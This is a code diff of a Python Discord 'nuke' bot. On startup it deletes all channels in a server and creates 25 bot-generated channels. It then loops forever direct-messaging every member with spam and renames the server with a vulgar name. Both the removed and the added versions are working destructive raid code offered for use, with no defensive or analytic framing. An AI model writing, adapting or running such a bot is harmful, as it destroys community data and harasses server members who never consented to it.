@@ -1,40 +1,33 @@
-import discord #Mandatory to use this to operate
+import discord
 from discord.ext import commands
 
-# Needed intents
 intents = discord.Intents.default()
-intents.messages = True
-intents.message_content = True
 intents.members = True
 
-bot = commands.Bot(command_prefix='!', intents=intents) # Basically does nothing
+bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
     guild = bot.guilds[0]  # Assumes the bot is only in one server
-    
-    excluded_servers = [2101234567898765432, 1234567890987654321]  # Replace with actual server IDs
-    
-    for server in bot.guilds:
-        if server.id in excluded_servers:
-            continue
 
-        for channel in server.channels:
-            await channel.delete()
+    # Deleting existing channels
+    for channel in guild.channels:
+        await channel.delete()
 
-        await server.edit(name='Replace This by choice')
+    # Creating bot-generated channels
+    for i in range(25):
+        await guild.create_text_channel(f'bot-generated-channel-{i+1}')
 
-    # Create 25 channels with the name 'your-choice-here'
-    for _ in range(25):
-        await guild.create_text_channel('your-choice-here')
-    
-    # Spam the channels with messages
+    # Spaming users in private messages
     while True:
-        for channel in guild.channels:
+        for member in guild.members:
             try:
-                await channel.send('your spam message here')
+                await member.send('Prepare to be spammed by the bot!')
             except:
                 pass
 
-bot.run('YOUR_BOTS_TOKEN_HERE')
+        # Renaming the server
+        await guild.edit(name='fucked-by-the-Plaidtechs')
+
+bot.run('YOUR_BOT_TOKEN')
